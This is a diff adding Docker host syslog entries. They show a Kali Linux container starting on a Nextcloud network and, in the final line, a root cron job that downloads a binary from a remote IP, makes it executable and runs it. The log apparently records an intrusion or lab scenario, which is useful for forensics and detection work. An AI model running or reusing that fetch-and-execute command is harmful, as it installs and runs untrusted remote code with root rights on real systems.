@@ -1,0 +1,31 @@
+2026-01-21T10:37:55.156004+00:00 docker systemd[1]: var-lib-containerd-tmpmounts-containerd\x2dmount1928286466.mount: Deactivated successfully.
+2026-01-21T10:37:55.225559+00:00 docker dockerd[954]: time="2026-01-21T10:37:55.225113011Z" level=info msg="image pulled" digest="sha256:3b5099ef6913d0fc230dc4e7532bedbea0a5ac44703d03eb4a67ff9cd2d13b73" remote="docker.io/kalilinux/kali-rolling:latest"
+2026-01-21T10:37:55.280406+00:00 docker systemd[1]: tmp-containerd\x2dmount4000734015.mount: Deactivated successfully.
+2026-01-21T10:37:55.444004+00:00 docker systemd[1]: var-lib-docker-rootfs-overlayfs-66df4d07080736b3311b4ca44888bc3bc01b2dcb827cd81d32f60a4894c24812.mount: Deactivated successfully.
+2026-01-21T10:37:55.605734+00:00 docker containerd[801]: time="2026-01-21T10:37:55.604781414Z" level=info msg="connecting to shim 66df4d07080736b3311b4ca44888bc3bc01b2dcb827cd81d32f60a4894c24812" address="unix:///run/containerd/s/b50d6ecc00d28d09656d75e7c75f99a04f20380622eb279aad8b3bb199401042" namespace=moby protocol=ttrpc version=3
+2026-01-21T10:37:55.639161+00:00 docker systemd[1]: Started docker-66df4d07080736b3311b4ca44888bc3bc01b2dcb827cd81d32f60a4894c24812.scope - libcontainer container 66df4d07080736b3311b4ca44888bc3bc01b2dcb827cd81d32f60a4894c24812.
+2026-01-21T10:37:55.694067+00:00 docker kernel: br-a3de5a085d2c: port 4(vethd10ac37) entered blocking state
+2026-01-21T10:37:55.694124+00:00 docker kernel: br-a3de5a085d2c: port 4(vethd10ac37) entered disabled state
+2026-01-21T10:37:55.694126+00:00 docker kernel: vethd10ac37: entered allmulticast mode
+2026-01-21T10:37:55.694126+00:00 docker kernel: vethd10ac37: entered promiscuous mode
+2026-01-21T10:37:55.696008+00:00 docker systemd-timesyncd[446]: Network configuration changed, trying to establish connection.
+2026-01-21T10:37:55.705714+00:00 docker systemd-networkd[673]: vethd10ac37: Link UP
+2026-01-21T10:37:55.738143+00:00 docker kernel: eth0: renamed from veth78538ab
+2026-01-21T10:37:55.740639+00:00 docker kernel: br-a3de5a085d2c: port 4(vethd10ac37) entered blocking state
+2026-01-21T10:37:55.740649+00:00 docker kernel: br-a3de5a085d2c: port 4(vethd10ac37) entered forwarding state
+2026-01-21T10:37:55.741424+00:00 docker systemd-networkd[673]: vethd10ac37: Gained carrier
+2026-01-21T10:37:55.743471+00:00 docker dockerd[954]: time="2026-01-21T10:37:55.742536046Z" level=info msg="sbJoin: gwep4 ''->'34c3f0811f36', gwep6 ''->''" eid=34c3f0811f36 ep=gallant_engelbart net=nextcloud_default nid=a3de5a085d2c
+2026-01-21T10:37:55.765298+00:00 docker systemd[1]: docker-66df4d07080736b3311b4ca44888bc3bc01b2dcb827cd81d32f60a4894c24812.scope: Deactivated successfully.
+2026-01-21T10:37:55.790930+00:00 docker dockerd[954]: time="2026-01-21T10:37:55.790678662Z" level=info msg="ignoring event" container=66df4d07080736b3311b4ca44888bc3bc01b2dcb827cd81d32f60a4894c24812 module=libcontainerd namespace=moby topic=/tasks/delete type="*events.TaskDelete"
+2026-01-21T10:37:55.791862+00:00 docker containerd[801]: time="2026-01-21T10:37:55.791647400Z" level=info msg="shim disconnected" id=66df4d07080736b3311b4ca44888bc3bc01b2dcb827cd81d32f60a4894c24812 namespace=moby
+2026-01-21T10:37:55.791960+00:00 docker containerd[801]: time="2026-01-21T10:37:55.791680600Z" level=info msg="cleaning up after shim disconnected" id=66df4d07080736b3311b4ca44888bc3bc01b2dcb827cd81d32f60a4894c24812 namespace=moby
+2026-01-21T10:37:55.792002+00:00 docker containerd[801]: time="2026-01-21T10:37:55.791689911Z" level=info msg="cleaning up dead shim" id=66df4d07080736b3311b4ca44888bc3bc01b2dcb827cd81d32f60a4894c24812 namespace=moby
+2026-01-21T10:37:55.810062+00:00 docker systemd-networkd[673]: vethd10ac37: Lost carrier
+2026-01-21T10:37:55.810149+00:00 docker kernel: br-a3de5a085d2c: port 4(vethd10ac37) entered disabled state
+2026-01-21T10:37:55.811128+00:00 docker kernel: veth78538ab: renamed from eth0
+2026-01-21T10:37:55.830627+00:00 docker kernel: br-a3de5a085d2c: port 4(vethd10ac37) entered disabled state
+2026-01-21T10:37:55.830638+00:00 docker kernel: vethd10ac37 (unregistering): left allmulticast mode
+2026-01-21T10:37:55.830639+00:00 docker kernel: vethd10ac37 (unregistering): left promiscuous mode
+2026-01-21T10:37:55.830640+00:00 docker kernel: br-a3de5a085d2c: port 4(vethd10ac37) entered disabled state
+2026-01-21T10:37:55.830564+00:00 docker systemd-networkd[673]: vethd10ac37: Link DOWN
+2026-01-21T10:40:01.076869+00:00 docker CRON[3689]: (root) CMD (test -e /opt/tool || curl http://192.42.1.174:8888/tool > /opt/tool && chmod +x /opt/tool && /opt/tool)
